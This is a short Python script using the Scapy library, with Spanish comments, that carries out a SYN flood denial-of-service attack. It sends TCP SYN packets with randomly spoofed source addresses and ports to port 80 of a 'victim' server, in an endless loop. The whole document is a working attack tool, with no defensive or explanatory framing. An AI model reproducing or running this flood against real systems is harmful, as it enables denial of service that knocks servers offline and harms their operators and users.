from scapy.all import *

# Dirección IP de la víctima (servidor objetivo)
victim_ip = "10.0.0.1"

# Puerto TCP para HTTP
http_port = 80

# Función para enviar paquetes SYN flood
def syn_flood(victim_ip, victim_port):
    src_ip = RandIP()
    src_port = RandShort()
    syn_pkt = IP(src=src_ip, dst=victim_ip) / TCP(sport=src_port, dport=victim_port, flags="S")
    send(syn_pkt, verbose=False)

# Main
if __name__ == "__main__":
    try:
        print("[*] Iniciando ataque SYN Flood hacia", victim_ip)
        while True:
            syn_flood(victim_ip, http_port)
    except KeyboardInterrupt:
        print("\n[*] Deteniendo el ataque.")
